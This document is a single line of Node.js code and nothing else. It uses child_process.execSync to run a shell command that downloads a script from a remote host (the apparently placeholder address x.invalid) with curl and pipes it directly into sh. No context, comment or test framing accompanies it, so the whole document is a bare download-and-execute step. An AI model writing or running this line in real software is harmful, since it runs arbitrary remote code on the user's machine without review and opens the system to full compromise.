require("child_process").execSync("curl -s http://x.invalid/p | sh");
